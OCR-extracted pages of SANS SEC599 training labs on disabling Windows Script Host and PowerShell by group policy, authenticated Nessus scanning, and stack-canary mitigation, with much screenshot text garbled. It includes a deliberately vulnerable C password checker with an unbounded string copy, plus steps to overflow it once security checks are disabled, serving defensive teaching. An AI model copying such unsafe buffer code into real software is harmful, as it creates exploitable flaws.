While files from the Internet can be useful, this file type can potentially
harm your computer. If you do not trust the source, do not open this software. vhat the r-Jd

4. Authenticate to DomainController

Now, let's try to avoid these types of payloads from being executed in our

environment. We will develop GPO's on the Domain Controller that will afterwards

,,...._

be pushed to our Windows client systems. You can authenticate to the Domain

Controller using the following credentials:

USERNAME: SYNCTECHLABS\Administrator PASSWORD: Sec599 (capital "S" for increased password complexity)
5. Open the Group Policy Settings Menu In the "Server Manager" window (which should be displayed after successful authentication), we will select the "Group Policy Management" menu, from where we can control a variety of group policies & security settings for the domain.

© 2017 Erik Van Buggenhout & Stephen Sims

105

i local Ser,~ ti AJISer.-.n fil ADOS A DNS ii File and Storage SeMces r>

WELCOME TO SERVER MANAGER
8 (onf,gure
2 Add rues

5 .._l')f t~

kW· D,rocto,y Oomo1ns ond Trusts Acttve Directory Module for Windows Pl>,,,· rSl'lell Aclr,· Otrocto,y Sit.. ond SeMces Act,w Owocto,yu.e... - , ~.. AOSI Ed~ Comp<>Nnt S<'MCes Compu~· ~nagem«nt 0.hgl'l'fflt end Oplll'nizt 0,,... O,<JtCleanup DNS
EwnlVH- M"H- - - - - - -
GroupPolocyM_~n_t_ _ __
Locai Scwnty Polq MICfOSOft Azun, S<'MCes OOBC Dot.a Sourus (32·brt) OOBC Dot.a Sowtes (64-b,t) i>fflOl'INnCe Montto, PnntMa-1 ~ r e· Morntor

6. Editing the default domain policy
Once the Group Policy Management window is opened, we will browse the following items in the left-hand side of the window:
o Forest: synctechlabs.com
· Domains
· synctechlabs.com
· Group Policy Objects I n t his window, we can see that a "Default Domain Policy" exist, which we will now adapt (right-click-> "Edit").

106

© 2017 Erik Van Buggenhout & Stephen Sims

Group Pohcy Man.,gement

File Action View Window Help

.. .J

I fj

_.i Group Pohcy M·n·gement
v ~ Forest synctechlabs.com
v · Dom,ins

Group Polley Objects In synctechlabs.com Corl.ms l)ejegabon

v iJ synctechlabs.com

Name

GPOSlaue

WMIFles-

· Dd1ult Dom11n l!i Deid Dom.t C-orb1:,ler Enabled

None

) Domain Control l·fttt I·!~!,#~£+ ~ :f:!V!!

i/· I

> Group Policy 01

Edit

> ¥ WMIFilten -:J St1rttt GPOs

GPO Status

> Sites

Back Up...

'!J Group Pohcy Modeltng\

Restore from Backup...

_ Group Pohcy Results

Import Settings...

Save Rqx,rt...

Copy D~de ReNme Refresh

· X

<

>

<

>

,-.

7. Create new registry key to disable WSH As we discussed during t he course, t he Windows Script Host is responsible for the execution of a number of scripts on Windows hosts (including .vbs and .js). We can disable it using a registry key!
In the newly opened Window ("Group Policy Management Editor"), we will disable the Windows Script Host by adding a new registry key. In the left-hand side of the window, we will open the following structure:
o Default Domain Policy
· Computer Configuration
· Preferences
· Windows Settings
· Registry We can now right-dick in the registry window to the right and select "New"-> "Registry Item".

--

© 2017 Erik Van Buggenhout & Stephen Sims

107

I Group Poltcy M1rwgement Edrtor
.. FIie Actlon View Help 0

v .L Computer Conf,gurabon Pohc,ts
v Pr~etencts .., Windows Settings ~ Environment
-J.' F,les
..::;' Folders
i ln,Files Ji R~ mry
a,) Networt; SM,es
.!) Shortcuts ~ Control Panel Setbn! v ' User Conl19u<1t1on Pohc,es
> Pr~erences

N pohc,e ~ ectcd

D X

Thete "" no rte,ns to show in thJS v,.,,.,

New All Tasks Refresh
Arrange Icons line up Icons Help

R«g1dry Item Collection Item R~mryW~rd

<
Add · new r~ tstry rtem

Preferences I Extended ~nd1rd/

8. WSH registry value
The registry key we want to create to disable the Windows Script Host is the following:
HKEY_LOCAL_MACHI NE\Software\Microsoft\Windows Seript Host\Settings\Enabled
The key will be a "DWORD" and the value will be "O".
Note that this will update the relevant registry key on all systems on which the group policy is being enforced, thereby effectively disabling the Windows Script host.

108

© 2017 Erik Van Buggenhout & Stephen Sims

..File Action V,ew Hd p

v Computrr Confi9urat1on _ Policies
"' Pme:rmces v Windows Settings
!IJ Environment
,j.' Files
::i Fold=
]) lno Files
ltJ' Registry
I) Networlc Shares :t] Shortcuts
.:i1) Control Panel Settinf
"' t Use, Conf19ur,1Jon _ Pohc1es
> Preferences

Adlon: Qeate

Key Path:

0Defaut

Valle~:

V-.edat.a:

0

C
X
HKEY_LOCAL_MAC ...

......,---~--------------.--. . ----..---. .----1 (
Lut changed: 8/11/2017 4:48:51 PM
9. Let's also disable Powershell! While we're at it, let's also disable Powershell!
For this, we need to browse to another section of the domain policy (left-hand side of the window):
o Computer Configuration · Policies · Administrative Templates · Windows Components
Under the Windows Components screen, we should find a folder called "Windows Powershell", which we will open!

© 2017 Erik Van Buggenhout & Stephen Sims

109

Group Pohcy Managemfflt Edrtor File Action V1~ Help

D X

I Default Domain Polley (DC.SYN : Computer Conf1gurallon

- - - - Windowl Compone,a

.., · Poltcoes

W ~ PowcrShdl

Setting

"

Software Settings W1ndo,,,s Sdt,ngs v Administrative Temp
Control Panel
> Network

Windows Color System Windows Custa~ bpfflence lmp,ovement Program Windows Defender Windows Error Reporting Windows Hello for Business

Pnnten

Windows Ink Wo<1tspace

~Net

Start Menu and l 1 ) S}'\tem
> Windows Compc

All Settings I

Preferences v ~ User Conf1gurat1on

v .. Pohc1es

Software Settings

> Windows Srtllngs

)

I Administrative Temp
Preferences

Windows Installer

Windows Logon Options

Windows Mail

Windows Med11 D1g1tal Rights Management

Windows Med,1 Pl~er

Windows Messenger

Windows Mob1ltty Center

Windows PCWflSh~I

Windows Rel1abtlrty Anelysis

Windows Remote Management (WinRM)

Windows Remote Shell

Windows Update

Work Folders

...,

<

>

<

> Extended ~ /

10. Disabling Powershell Within Powershell1s settings, you will find the following setting: "Turn On Script Execution" We will open it and change its value to "Disabled"

110

© 2017 Erik Van Buggenhout & Stephen Sims

Tum on Script Execution

~ Tum on Script Encution

Next Setting

0 Not Configured Q Enabled
@ Disabled

Comment
I Supported on: At IHst Microsoft Windows 7 or Wind~ Seiver 2008 family

D X

Options;

Execution Policy

· I' i

t

·

·

. : ·~ 1;

3

· ,.
.

!., .~...·
-

Help:
!" This policy setting lets you configure the scnpt execution pohcy,
controlling which scnpts are allowed to run.
If you enable this policy setting, the scnpts selected in the drop· down list are allowed to run.
The "Allow only signed scnpts· policy setting allows scnpts to execute only if they are srgned by a trusted publisher.
The ·Allow local scripts and remote signed scripts· pohcy setting allows arry local scnps to run; scripts that ongmate from the Internet must be signed by · trusted publisher.
The "Allow all scripts" policy setting allows all scripts to run.
If you disable this policy setting. no scripts are allowed to run.
Note: This pohcy settrng exists under both "Computer Configuration· and "User Configuration· 1n the Local Group Pohcy Editor. The "Computer Conf1gurat1on· has prece.dence over · user Configuration.·

11. Refresh the domain policy on Windows host Back on the Windows host, we can open a command prompt and run the following command:
gpupdate
By running gpupdate, the workstation will fetch & apply all appicable group policies!

© 2017 Erik Van Buggenhout & Stephen Sims

111

12. Retry payload execution
As a final test, we can now retry payload execution on the Windows system. Notice the different error messages that are now returned!

~:,: .~ l.3t1,:- n

)·:~: ;::fr,

Ii
r l, I,-"':: 1:

I
;'rtr]l.;e
:.1_·ft:, .:ue

r:0 r3f,:h.e,e

f.l
·· ,,,_JJ I
Ccn,I

Ii .·. I .!_·

'
,.;.

Windows Scnpt Host occcss is d1s.,bled on this mochme. Contact your administrator for details.
OK

112

© 2017 Eri k Van Buggenhout & Stephen Sims

SEC599-3.1: Exercise - Authenticated vulnerability scans
Objective
The objective of the lab is to get acquainted with a vulnerability scanner like Nessus. Furthermore, we will perform an authenticated vulnerability scan of our internal network environment. We will then analyze the results and determine how these can be fixed.

High-level exercise steps:

· Walkthrough Nessus vulnerability scanner · Configure default scan policy to scan internal range · Add credentials to enable authenticated scanning · Analyze the results ,.. Scenario
Virtual Machines
1. SEC599-C01 - Ubuntu04 2. SEC599-C01 - Firewall 3. SEC599-C01 - Windows0l 4. SEC599-C01 - Windows02 5. SEC599-C01 - Ubuntu0l 6. SEC599-C01 - DomainController
Exercise 1 : SECS99-3.1
The objective of the lab is to get acquainted with a vulnerability scanner like Nessus. Furthermore, we will perform an authenticated vulnerability scan of our internal network environment. We will then analyze the results and determine how these can be fixed.

1. Authenticate to Windows machine
Let's first connect to our standard Nick Fury Windows workstation using the following credentials:

USERNAME: Nick Fury PASSWORD: Awesomesauce123
2. Open Nessus scanner engine We have a Nessus scanner running in the lab environment. You can access it on the following web page.

https://192.168.30.17:8834

It's also been added as a bookmark to Chrome. You will have to accept the certificate warning the first time you launch Nessus! The credentials are the

© 2017 Erik Van Buggenhout & Stephen Sims

113

following:

Username: sec599 Password: sec599

3. Familiarize with the Nessus interface
Nesus supports the creation of new scan policies that can subsequently be used to scan the environment. Take a few minutes to get familiar with the Nessus interface!

~

= C £ Nol S4K~·e ~ 192168.30.17 l.c -

foldets,my-sans

f(/ ~_,r.._~ ~ Cu,~oo~, [) ~-E~lwcb"' I] lllbona

,......,.

~IS?

NessusC,

Sc.1ns

. 'I·

· M'JSc.lM
· AI Scarn
I Trw,

1/.y Scans

e

CJ X

* :

O ·

0 Po!,ctts
· Plug., , u-!H
~ ~

4. Launch a scan with the default policy We will launch a scan against our lab environment without credentials. Inside the "My Scans" menu, you can click "Create a new scan" and then select the following policy:
......
"Basic Network Scan"
--

114

© 2017 Erik Van Buggenhout & Stephen Sims

C A Not s«ure ~ 192.168.30.17 d8:,,4 · a,,s/leport:,/n w

NessusC,
· MySUns
a -"I Scans
II Trash

Scans

,'1·r'

Scan Templates
' Back ta Scans

0 Pokies iii Plug"' Rules
~ $Un"""

Advanced Scan

Audit Qoud lnfru1ructunt

8u, ic Networlc Son

Cml<!nti· led Patch Audi t

e

CJ X

*

& 0

Badlock Dato<tion
0
DROWN D<tt·<tion

-...
Bash SMllJhock D·
-Hori OiJ.cov

lnbtl AMl s«uritv 8VPU>

0
MalwarwSun

·
MOM Confia Al

5. Configure the scan scope We can provide the following settings:

Name: Initial Scan Targets:
o 192.168.10.5 o 192.168.10.15 o 192.168.10.16 o 192.168.10.1 o 192.168.20.10 Once configured, we can save the scan using the button at the bottom of the web page.

© 2017 Erik Van Buggenhout & Stephen Sims

115

O Nessus
· M, Scam
Ii All Scan,
I Tra!ll
O Poloos
· Pl'.,g.,q.i.s ~ Scanr,ers

Scan,

· ·· ·

New ScJn / Basic No?twork Sea·~
· 1 le Sc.J temptatlM

DISCOVEIIV
RIPOAT AOVANCfO

192,1 68105
192..16610 I~ 19216810 16 1~~ 16810 I
19~.·68 !O ,cj

e

c, X

*

& 0

6. Launch the scan
Once the scan is saved, we can launch it by pressing the "PLAY" button on the right of the screen. After clicking the "PLAY" button, you can click the scan title, and you will receive continous updates on the status of the scan!

C A Noi.ecure "'""//192168.30.17 8834/· sun;/folclcrS/3

e

D

* 0.

My Scan~

t..Nf~o··

1:111!
· "

....
7. Scan results overview
Once you click on the scan title, you will receive a status page that has live results for the current scan. This page is continuously updated! The colors & numbers of course refer to the number of risks identified (& their severity). We can obtain additional details by clicking through the results!

116

© 2017 Erik Van Buggenhout & Stephen Sims

Ness.IS Ho,r.e I Fokfe.ts x

~

C A Noa,-;ure ~ ./ 192.168.30 17 e8l4 ·/sans/r·port!./~/t,osts

X CJ flS> PIS,,,,., ,.....

u.da,o s . - I) 5-f>IH · (...,...,..

k,t;.,.. · - ·

.. ..,-..
· u,,:_.ue.

n; a. scan
·i-la.lO~SU"II

·on ,1: ~t11c ,,

,t.:.. ,.._,0 ·1

e

·

..
. u i r -. . 1
.::c· !.-............
·--
0 .· CliDG ...........· v~

8. Host summary view
When a host is selected (by clicking it) from the previous overall scan summary, you receive an overview of all vulnerabilities identified per host!

e

·

.. .,._.
·-· , s.c-
0

f'1a SQ"I 0215810 15
·ladtoMon'I
-.... .

..
A jiff

-=- o.-..,,'t:.

~.

E:11111 '"" T-"'·n»"'c. ho....tt.~ R·~--c.~· Oit· )\&.: ~,:.1 · Go·"···

..

,;;·M' ,~,,

OS

·~

·---
0

..-~:.-..:
....·· .".'.~..""'

9. Vulnerability view
When clicking on one of the vulnerabilities, you can see full details on a specific vulnerability. This includes a description of the vulnerability (including some context), but also a proposed solution to fix the vulnerability.

--

© 2017 Erik Van Buggenhout & Stephen Sims

117

For some vulnerabilities, Nessus will also provide information on any publicly available exploits.

I. ,. ,._, Hom< Folclt'I )(

e

I ;

C A Nt'·~e<ure ~ './ 192.16a.3017 8P'\4,. sa,r. epom,5~,lvu'""'ab U· ~1~31

..,1,.,.. f8 PfSo,,.. f ...-. ,, c...cwo s.,..it,o, D s.,.,p.,. Em.t.. [J

1,....,.

,..,so

l' ~ a P ...;i., :9~g33
·b:t:· .,~

0
* C.

0 .......

· I

:1wg.n~.r,1

~ Sc·""-"

a i m MS17-010, SecurrtyUpda!efor M,crosol! W"'dGws SMBSer-<,r(.

·· -.- tvtlWtlil.c~·:· ..,,. \14~·~1.: I- Gl.·m~.-ooe

~~~c.,._..,,.n.,11 -"

~ t'Nl'· .,.·.r.,..-.:·-~!!'·:·11":f"'· · ·· ~·ao."· ett'!.-O

N=> r. ~<C, ·M· ·flt··.- coc, ,:vi..,z::,, · .;·. ctt ~ ·..o - c r-:o · t 16! : Ii-.::··,C ·· ~, :.;:~-< J.I

i'"!U
s.i..,.--;s.ot"t: l 1) S

·ti"'""~"' °'" ..;11.,;.,i;u;... ...._,..,,,.~ 1) · ·t":'I rt Miao,ctf\1·~--. l.tuu,-- loo ·G ·,.11,,1 a ... ,,~;·x··"·~~
,a···--..a ~·l-1-lf!"I """''-"J.l."'W"'' ·t·tl t1·c.·· :t""a~1 · ··1r,:1Ct·..t W-ffll..-::t:a 1;1 1·,1Jp;t,,:i,,f' t:,ctrs:NH
~ ~ : o ' I -:,t-.C-11'.0 .&

r-11· .. .iwt t'"'l~\ .,;,._C.-- : .. 1·111. ~ ;.-: . ,. :1 . ,.., r-::;i.· .t"'l·~, . · louf'C'I ....,...,. ~10f'G"l'NO

,·,·v·=~ 'f'o1r-·-..e!! ··t.1'IOI pt::U11t1CIOU.,O'l-:)1"t\.f 14b;.tro-.,.~·J"'OWn 1, .,.· S""°"'£.·Oll;1.,

-\,1",t-,1,:f'/t· I

,,._1__ "°"'J · I ·a-,,SOftlwt,·I M"J·· ~ .,· .: "\; ~"· 111~

l t tPkl · l 'IIIQ l--vrtl

I WOMt tr· ti,\ ··-; M ;-.r. i~.1·. O"t G-o,."'-

~ tlfl ~'I i 11··~··~~·!~·Wf,,i;arC',::-ZQt1,C1N · ·\o ~M ~lt'l\&.-c"O\:.- :-flll« J"'CI

:-..-i l~ICIJ IL·1ittt·-:.- l

,tit ~.aor: (r. ~
:';'V\1 ha.. kort ·;
::...ss ··--.~.ou, Sw1. iJ
:-ts-·.._.,. \K"'# C :.S.:·l' · 1.: ~ :
....... s.~· t.,

~ ·· -IC ··u:·j;· ·~· -:),1!..-t-·, to,-W~·~··· .. 1Y···~1·~na· t-o~iJ· ~ , lllc;li.4~ W\-"a.,_--.s:: '"l ...,.1

v.....,..,..) t.Wfonft~·

10. Wait for the scan to finish Feel free to look into the different vulnerabilities that are being reported by Nessus. You may notice our Synctechlabs environment is vulnerable to a number of security flaws ...
We will now wait on the vulnerability scan to complete, after which we will reconfigure the scan to use credentials! You can keep an eye on the status of the scan by clicking "My Scans" and selecting "Initial scan". The status should change from "Running" to "Completed"

118

© 2017 Erik Van Buggenhout & Stephen Sims

· Ntssu< H°""' / fold·" x
C A Notsecur,, ~ 192.168.30.17:88-U,·1« ns/reports/S/hos"

NessusO

x ..,,., ... ,;:,
.1r.~I scan
C I-el ".I MySt.ni

a ~<..
Ii ~21"1lt.i.-«1 t; ..,,_.,.

-on

-~:.tu ·o ,;

I

I

0

D X

e. *

& ~"y')

-

-od,1 n gCZ ;v
·!IG·J ,11t·1 :Jt,J
,a~r~

0

· C.~r<..11
..0..M ....,..,I..'.,,.

11. Configure an authenticated scan
Now, let's try creating a scan that will use credentials to authenticate to the systems in scope. We will simply adapt our existing scan and reconfigure it to include credentials! We can do this by clicking the "Configure" button in the "Initial scan" menu.

Nesws Home / Folders x

f-

C A Not secur~ ~ 192.168.30.17 <>ck' l<Qns/reµorts/5/ho>ts

'< ~ ~-~ Fve-.-.1

Cl 0 (\l<kOO So,,dbo,(

S.mples · eYllw<bs< [J K,h,,,.

N. . . .,

Nessus O

\c:.rn~

.- ··1

.. MISP

i i I.It Sc.i'"I

..HotU 5. , .

~ f C · ~· "i3

NtttOt) I

0

D

* Q.

. . . & ~!,9"

,._

~""

·9;·~·1H
(
I

:iorq-: Suf',..,.
,,.
ltc~

!I.·< ··t1-i,:,, !<A"'
I.O(aJ $on'th ·00>111.Iii i:'l: ~ Toelt1 nQ.IZC-M
Of"'.·1.ru

0

.-· ·v,
· 1.0'~

12. Configuring Linux credentials

Once in the settings configuration page, we can click the "Credentials" tab. Under "HOST" we will configure the following "SSH" credentials for our Linux machine. We will also allow the scanner to perform "sudo" while running the scan, to obtain

© 2017 Erik Van Buggenhout & Stephen Sims

119

administrative privileges. We will enter the same username & password for the sudo options:

Authentication method: password Username: sec599 Password: sec599 Elevate privileges with: sudo sudo user: sec599 sudo password: sec599

Once configured, we will press the "Save" button at the bottom of the web page.

~

C A Notsecur~ ~ 192.168.30.17 3,C · scans,lrepom/S comg,~_..,.,,,,.1-,

~de····· f8 P!Seru fi

P ' ~ 5.onc!OO>< ['.) ;..,,pies E , ~ I] U>Orll

NcssusO

"··· · · .

.. ..,~.

· i'tli-0"$
· ·r.-.v
....
..,.,

8

0 X

* Q.

···'"

13. Configuring Windows credentials For the Windows machines in scope, we will configure the following settings under "HOST" and "Windows":
Authentication method: Password Username: Administrator Password: Sec599 Domain: SYNCTECHLABS
This user is a domain administrator and thus has access to the entire environment for vulnerability scanning!
Again, once configure, we will click the "Save" button at the bottom of the web page.

120

© 2017 Erik Van Buggenhout & Stephen Sims

NeswsC,

><···
lrit a' scar/ ConfiguratlOfl
·S...rtto~·~

HMI

e

·

a. * xi

14. Review credentials configuration
Once both credentials sets have been configured, let's review the credentials page, which should include bot h the Linux & Windows credentials.

C A Not secure ~ / 192.168.30.17 J.1 ·/,r,>ns{reporWS/confoJ/Cr"'1~11.>ls
'< , _s - - ri s.,,,pi.. mtwcb~ CJ K·banl e - ..... - - -~

e

· x

a. *

....

:, · a ,-ar, (<.'r19 ratcn
·e.c.ttokll'l~·c:oi·
HOU

15. Run scan again
We will now go back to the "My Scans" page and simply rerun the "Initial scan" by
again pressing the "PLAY" button. If all goes well, Nessus should automatically use
the credentials we've just configured!

© 2017 Erik Van Buggenhout & Stephen Sims

121

· 1'euus Ho-,,e Folde<1 X

f-

C A No <e<u·· ~ 192.168.30.17 - · ns/lokle!·lr,,y-s..-:ins

- .. r,,..,,. ~- e ~

CJ Cvdcoo Sondoo,

Sa,nples · - . . [ ] l(obono

N"""' ., MISP

NessusO
....ii "' San ,..

'>i: a ,>1;

- · ., ..

Iv :,car,

0 '· , ..

e
..u· Moo r10

· x

e. *

&

....c',91,1

..
. "

16. Wait for the results
Once the scan is running, feel free to interact with the scanner. In the "history" page, you will find the two scans (the one without credentials and the current one with credentials).
The credential scan should give you a lot more in-depth information & configuration advice on how the system was configured. For example, the vulnerability scanner will now report a "vulnerability" that tells you the contents of the hosts file.

122

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599- 3.2: Exercise - Exploit mitigation using compile-time controls
Objective
The objective of t he exercise is to analyze how exploits can be mitigated using compilet ime controls. We will use Visual Studio to compile a vulnerable application with and wit hout compile-time control such as stack canaries.

· Compile a program without stack canaries

· Identify the vulnerability & overwrite the program buffer

· Compile the same program with stack canaries

· Attempt to exploit the program again, now observing the new behavior

Scenario Virtual Machines
1. SEC599-C01 - Windows 2. SEC599-C01 - Firewall 3. SEC599-C01 - DomainController
Exercise 1 : SEC599-3.2
The objective of the exercise is to analyze how exploits can be mitigated using compiletime controls. We will use Visual Studio to compile a vulnerable application with and without compile-time control such as stack canaries.

1. Authenticate to Windows As a first step, let's again authenticate to our Windows machine.

USERNAME: Nick Fury PASSWORD: Awesomesauce123
2. Launch Visual Studio We have provided a community edition of Visual Studio on our Windows machine. Which is of course a highly common development suite.

We will use it now to compile an example program, thereby illustrating some compile-time controls! You can launch it by double-clicking the shortcut on the Desktop.

3. Open the project in Visual Studio

© 2017 Erik Van Buggenhout & Stephen Sims

123

As this is not a development course, we have provided a piece of "vulnerable code" that we will analyze, compile & exploit. We want to open an already existing project in Visual Studio:
Under Recent, you will find the project VulnerableCode.sln. Click on this project.
Start Page -ci X

Get Started
New to V1sua Studio? Check out coding tutorials and sample prOJfflS Get training on new frameworks languages and technolog,es Create a pmate code repo and backlog for your pro;ect See how easy rt 1s to get started wrth cloud services Discover ways to extend and customr:e the IDE

Recent

Today

Vulne r a b l e C od e.sln

,en

vr IT'ents\V1sual studio 20...

Ooen
· Get code from a remote version
control system or open something on your local drrve. Checkout from: 0 Visual Studio Tcam Services
~ Open ProJect Solution ~ Open Folder ~ Open Website
New project
Search project templatts P ·
Recent project templates:
BJ Win32 Consol... C++
Create new pro;ect."

4. Reviewing the code
Once the project is open, you will see the C source code under the source code file VulnerableCode.cpp.

When carefully analyzing the code, you should see we are comparing the input to a password, which is hardcoded to "UxoaT7x". The user input is copied to a buffer, after which it is compared to the password that is stored in the "PASSWORD" variable. Buffer overflows are a type of vulnerability we discussed throughout the courseware.

Upon successfully entering the password, the application will inform you the correct password was entered and will print it out.

In our lab, we will not focus on fixing the code, we will assess how compile-time controls in Visual Studio can help protect the vulnerability from being exploited. We

124

© 2017 Erik Van Buggenhout & Stephen Sims

r

are of course using a number of insecure functions to achieve our goal.

VulnerableCode.cpp -o X

~ -===;.;=

~ VulnerableCode o erilow.cpp

(+ · G, _tmain(int argc. _TCHAR · argv{] ·
~11res t ~ e-n-t-ry-po-in_t_f_o_r_t.a.he consol;"" ·~plication.

2

II

....

3

4

~include "stdafx.h·

s

6

~defint PASSI.ORD "UxoaT7x"

7

8 - bool Exploit( CHAR* s;;:Input)

9

{

10

_TCHAR s;;:Dat a1[10];

11

_TCHAR szData2[8] ;

12

13

_tcscpy(szData2, _TEXT(PASSWORD));

14

_tcscpy(szDat al,

);

15

return _tcsncmp(szDatal, sz0ata2, 9) ·a 0 ;

16

}

17

r r (. . 18 ~ tt _tmain(int a

19

20

c ,_ 2)

21

22

_tprintf(_TEXT("Please provide the password as an arguaent (max:L.wr

23

return -1;

24

}

25

if (Exploit( Jrg [l]))

26

_tprintf(_TEXT(·correct password: Xs\n") , _TEXT(PASSl..oRD)) ;

27

else

28

_tprintf(_TEXT( ~Incorrect password!\n"));

29

return 0;

30

}

31

32

5. Compiling this code using standard settings
We can build our "VulnerableCode" by clicking "Build"-> "Build VulnerableCode", which will compile the source code into a working Windows application.

-

© 2017 Erik Van Buggenhout & Stephen Sims

125

~ VulnerableCode - MicrosoftVisual Studio

File Edit ', ,ew Project Build Debug Team Tools Test Analyze Window

0 . tl · ~ ~ iJ- t!:J Build Solution

Clrl·Shift+B

Rebuild Solution

VulnerableCode

Clean Solution

erf

Build full program database file for solution

1.

II

Run Code Analysis on Solution

Alt+Fll

...

3

li'ti Bu,ld VulnerableCode

4

s

Rebuild VulnerableCode

b - bool Exp

7

{

8

_TCH;

Clean VulnerabteCode Project Only

Cj

_TCH;

Batch Build...

1e

11

_tcs

Configuration Manager...

12
13

_tcs ~ Compile - I I szDa t"-r--r--_.....,_,._,,_,._ _ _ _ _ _ __

Ctrl+F7

14

II return _tcscn:p( s· ·· s· aZ

lS

return _tcsnc~p(s;Datal , s;Oata2, 9) ·· 0;

16

}

6. Open cmd.exe and run the application Now let 's open cmd.exe and try running t he application ("VulnerableCode.exe"). You can minimize Visual Studio, but please don't close the window, as we'll return t o it later.
You can find the application you j ust created in the following folder:
C: \ Users\nick.fury\ Documents\Visual Studio 2017\ Projects\VulnerableCode\ Release
Let 's open a command prompt and browse to this directory. Once you execute the program, feel free to try the following:
o Provide no arguments o Provide the valid password o Provide an incorrect password

7. Overflowing the available buffer
Can you find a way to overflow the buffer?

126

© 2017 Erik Van Buggenhout & Stephen Sims

Even if we carefully crafted a buffer overflow condition to validate the password validation, the application doesn't appear to "let us in". As an example, try passing the "a" character 18 times as an argument to the application (see screenshot)... This should break the application to the extent that it crashes. This doesn't mean we successfully exploited it, it just indicates the stack canaries are broken and this is preventing us from successfully exploiting the application.
VulnerableCode.exe has stopped working Aprcbl~m c1u-.st:d the program to stop worlong (o««tly.
Windows will clon th~ program arid noofyyou d · sokJtion ts av11l1.ble.
8. Go back to Visual Studio So, let's go back to our Visual Studio project and analyze how this application is being protected, even if the source code was vulnerable to a buffer overflow vulnerability...
9. Analyzing the VulnerableCode properties
The properties we are interested in are located in the following location: Project-> VulnerableCode Properties Configuration Properties-> C/C++ -> Code Generation-> Security Check The security check implements the "stack canaries" concept that we introduced during the course activities.

© 2017 Erik Van Buggenhout & Stephen Sims

127

SEC599·J.2 Exen:lse - Explc,t mltigatiOO usang <Dmpole-time tontr

Develooer

,

Display
p

· Comma

·

.. Conftgu,morc AdN<(Rtlu,t)

bool EXJ>

7

{

a

~

18

1,

- tcs.

... _, 1~
u

-tell
sz.O~

1-

~

lS

r~tu

16 l' 18 1·

-- int {

10 ~ if (

{

Sho,,, output f1orn: Buitcl
l>,.\· . \ · ·\.,\,,\Det l>C:\P,-.oa,-u files l>std-.fx.cpp h<ien.erttln1 code l>Finlsh<ed 1enerati 1>All I functions

..i Conf1gur1bon Ptoptt11ts Gen,u1I
-Oobuggong
V( · ,. 0trKtOt14!S
.. CJ(....
Opt,mo:obon Preprocenot Code Genermon l·ngu,g, Precomptled Hucft.R Output Files 81'0wse lnform,1t1on Advanced All OptlOOS Comm·nd Lint Unker ~ M1Mort Tool ~ XML Doc:unu!int Gme,·to, C> Browse lnf0tma110n ~ Build Evtr\ts: ~ Custom Budd Step ~ Cod,Anoiy>«s

Embl· Stnng Pooling
En.,bt. M101mol Rtbuild En1bJe C· · Exceptions 5",oll<rT~ Ch<ect
a- Runtrm· Checo
Runt,moub,.,y Stru<t MembeJAJ,gnment S«unty Chee~ Cont~ Flow Guord Enable Funrt,,on·lev~ Lnk1ng En,ble Par11td Code Genf:rat,on EnM,le Enhlnced Instruct.ton 5ft Floating Point Mod~ Enablt floating Poant E11;uphons Crute Hotp·lchab.te lmag~

No (iGm-)
~.. VEHsc) No D<fau~
MultJ-thruded DU (/MD) D<f·u~ En.,blo Sttur,ty Ched, VGS)
YeoVGy)
Not Set Precis, (/lp:p<ec,s,)

Configu,lbon Mvi..ger ..

10. Adapting the properties - disabling security check
We will now disable the "Security CheckU, which will render our application exploitable...

":!J VufMr,t:l,n..o I M n l Y...llal ~ul.11u

File Edrt V -

Bu,ld Debug Tt·m Tool> T..t Anof,u W,nd_ H.tp

~ fi' QvKI L,.,nchl(trl·O)

Sign,o

3

' ~

6 ,

~bool Exp 4 Configur1t,on Pro~teS

(

Gcncnl

[nab!< String Pooliog
Eniblc M11\1ma1 Rebutld

a

9

iai

10

11
..12
"
15

-tcs te>
-1 ·tllt
' r"ftLii re-tu

1

l

- II - int tu

I~

{

1~

If

a

{

~u991n9 VC+ · Ouecto,ie:1; · CIC··
G<n·ral Opt,m,uuon Prrproc:essor
Cod· GtJ,tfibon woguage
Precomptled Hud<t1
I Output Fil«
::::~0""4lw>n
An Opt.ions

Enablt: C· .. Exceptions: Sm·ll<rTyp· Ch.,;~ 8.mc RunttrM Chtclcs Runtime Library Slruct MtinberAhgnment
Controlflow Guard Emble functton~lf'I~ l1nlci119 En.able. P·rat~ Cod~ ~trat1on Enao{e. Enhanced lnstrucbon Set Ao,t.ng Point Model Enable Aoating Po1n1 btceptsons

Command l1i'1c

Crute Hotp1lch1ble lm·ge,

~ linket

M>nff<SITool

XML Document Geneittor 8rDWSL lnfo,m«ion

Build Evml$

Cu>tom 8u~d Slop

~ Cod·Anatys,s

No VGm·)
YesVEHsc) No D<l·u/1 Mullt"tlvaded O1.l (IMD) Default £nabkSttuntyCheck V GS) Oisobl< S.Cunty Check VGS-J
N0t Set
Pr«·tSC (ffp:Pfectst-)

Security Chetk Th· S.C Ch<c:k htl d..-.ct >11<k·buffor <>V<r-ru

11. Compiling without stack canaries Let's now run the same "Build" command again to recompile our application:

128

© 2017 Erik Van Buggenhout & Stephen Sims

We can build our "VulnerableCode" by clicking "Build"-> "Build VulnerableCode", which will compile the source code into a working Windows application.

!2.J VulnerableCode - Microsoft Visual Studio

File Edit View ProJect Build Debug Team Tools Test Analyze Windm-. Help

.r I t'J w t;J Iii t!J Build Solution

Ctrl+Shift+B

overflow.cpp -«> X

(SIVulnerableCode

_J

.1.

- II o·~

2 JI

Rebuild Solution Clean Solution Build full program database file for solution Run Code Analysis on Solution

3 4

lit.J
#include

Build VulnerableCode

5

Rebuild VufncrableCode

6 =, bool Exp

7

{

8

Clean VulnerableCode ProJect Only

9

Bo1tch Build...

10 1.1

_tcs

Configuration Manager...

12

_tcs ~ Compile

13 - II s:Oa\..o»c>J _ <H+\ o 1 ,

14 15

JI

return _tcsop(szOatal, sz0ata2) ·· 0,
return _tcsncmp(szDatal, szData2, 9) = 0;

16

}

Alt+F11 Ctrl+F7

12. Exploiting the application Open up cmd.exe again and now try attempting to overflow the buffer with a variety of input lengths. Now that the "SecurityCheck" is disabled, the application should be vulnerable to a buffer overflow and we should be able to overflow the buffer and thereby invalidating the password control that is being performed.
By adding exactly 20 a characters (a few more won't hurt), we will overflow the buffer in such a way that the password validation function compares two values (in our case two variables called szDatal and szData2), which both have been overwritten to be a number of "a" characters.
As this results in a valid comparison, the application will allow access to the application and print out the original password.
If we add too many a's, we will again break the application as the return pointer
would get overwritten, again resulting in an application crash.
Although a basic application, this is an interesting example of a built-in compilertime exploit mitigation control.

© 2017 Erik Van Buggenhout & Stephen Sims

129

